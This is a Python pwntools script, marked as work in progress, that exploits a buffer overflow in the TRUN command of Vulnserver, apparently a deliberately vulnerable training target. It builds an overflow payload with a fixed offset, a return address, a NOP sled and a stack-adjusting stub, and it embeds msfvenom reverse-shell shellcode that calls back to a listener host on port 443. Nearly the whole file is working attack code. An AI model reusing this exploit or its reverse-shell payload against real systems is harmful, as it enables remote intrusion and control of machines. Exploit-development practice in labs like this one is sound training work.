#!/usr/bin/python3

# ============================================
# Vulnserver TRUN exploit via Socket Reuse (WIP)
# ============================================

from pwn import *

# === Target info ===
host = "192.168.145.128"
port = 9999
s = remote(host, port)

# === Initial Variables ===
vulncmd = b"TRUN /.:/"  # this should cause the crash
crash = 3000  # a payload of this size triggers the crash
offset = 2003

# === Payload ===

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.145.1 LPORT=443 -b "\x00\x0a" -f hex EXINTFUNC=thread
shellcode = binascii.unhexlify("dbdcd97424f4ba66eed4505b33c9b15231531703531783a5ea36a5d51b344625dc59cec0ed59b4815e6abec7520192f3e1673bf442cd1d3b527e5d5ad07db2bce94dc7bd2eb32aefe7bf991f838a2194df1b2249971a03dca34483df60fd8ac76538447c5db65754af37fb991fca05de98357016dbc883eda11601f502dcb1d1b3312792b8fe23fcdc01e777d88a065768c82c73308a4d229c7d71347f21d73f92366a62fbfb479cfb93d0efc93c4b6762b4557085ef22ee78105327bf44035f16e5c89f97305ecf37eb1fbff75bc8d5f784e8d6ddac832db612fbbc47fbfebe4640775822a6def3db5f7b8f7a9f51eabd2b560b73dc131fe42c6e7da33344e92fa103e926da9bbe6f2cd22a82174c485fc1b7c8843239d1490e1dc1978f19b547c6f7632eb0b9ddf86f10897d5ca3cf8189552f33642050fce0a429e0904be0a0a101a88129cc399037ef94d7416c1ca8b56c55adf22a86df6bdfa84c8bca")

payload = b"".join([
    vulncmd,
    b"A" * offset,
    p32(0x625011af),
    b"\x90" * 101,
    b"\xcc",
    asm("push esp; pop eax; add ax, 392")
    ])

payload += b"\xcc" * (crash - len(payload))  # padding

print("[+] Sending payload..")
s.send(payload)
print("[*] Payload sent!")
s.close()
